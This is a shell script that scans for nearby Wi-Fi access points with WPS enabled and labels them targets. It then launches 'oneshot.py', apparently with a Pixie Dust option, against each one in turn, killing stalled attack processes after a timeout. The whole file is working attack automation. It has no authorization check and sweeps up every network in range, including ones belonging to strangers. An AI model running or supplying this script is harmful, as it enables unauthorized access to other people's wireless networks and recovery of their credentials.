#!/bin/sh

TIMEOUT=30

if [ "$1" ]
then
	IFACE=$1
else
	IFACE="wlan0"
fi

echo "[*] Scanning networks around..."

TARGETS=$(iw dev $IFACE scan |\
awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC};\
                        $1 == "SSID:" {wifi[MAC]["SSID"] = $2};\
                        $1 == "WPS:" {printf "%s\t%s\n",wifi[MAC]["BSSID"],wifi[MAC]["SSID"]}'|\
sed --expression='s/(on//g')

if [ "$TARGETS" ]
then
	echo "[+] Found targets:"
	echo "$TARGETS"
else
	echo "[-] No targets found"
	exit
fi

TARGETS_BSSIDS=$(echo "$TARGETS" | awk '{print $1}')

for TARGET in $TARGETS_BSSIDS
do
	echo
	echo "[+] Shooting $TARGET"
	python oneshot.py --bssid $TARGET -K -F -i $IFACE -w || true && killall sleep 2> /dev/null &
	sleep $TIMEOUT && echo "[-] Timeout!"
	
	PIDS="1"
	while [ "$PIDS" ]
	do
		PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
		for PID in $PIDS
		do
			kill -9 $PID 2> /dev/null
			echo "[*] Killed oneshot process"
		done
		sleep 1
	done

	wait
done

echo "[*] Jobs done!"
